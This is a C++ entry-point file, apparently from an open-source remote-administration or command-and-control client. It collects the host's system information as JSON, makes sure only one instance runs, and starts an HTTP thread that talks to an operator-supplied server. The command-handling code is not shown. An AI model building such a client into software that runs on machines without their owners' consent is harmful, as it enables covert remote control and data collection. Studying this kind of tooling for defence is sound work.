// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 

#include <iostream>
#include "utilities.h"
#include "operations.h"
#include <thread>
#include <Windows.h>
#include "base64.h"
#include "stringUtil.h"
#include "sharedResourceManager.h"

constexpr auto NUM_OF_ARGS = 3;

int main(int argc, char** argv) {

    if (argc != NUM_OF_ARGS) {
        std::cerr << "prog <URL/IP> <port>" << std::endl;
        return -1;
    }

	// Ensure that only ONE instance of this program runs on sys 
	HANDLE hMutexHandle = CreateMutex(NULL, TRUE, L"clientHTTP");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		std::cerr << argv[0] << " is already running on the system";
		return -1;
	}

	const std::wstring host{ StringUtils::s2ws(argv[1]) };
	if (!isValidPort(argv[2])) {
		return -1;
	}
	const std::wstring port{ StringUtils::s2ws(argv[2]) };	
	const std::wstring jsonSysInfo = getSysInfoInJson();
	if (jsonSysInfo.empty()) {
		std::cerr << "Couldn't extract system information\n";
	}
	SharedResourceManager sharedResources;
	sharedResources.setSysInfoInJson(jsonSysInfo);
	sharedResources.setServerUrl(host + L":" + port);
	std::thread httpThread(httpService_t, std::ref(sharedResources));
	httpThread.join();

	return 0;
}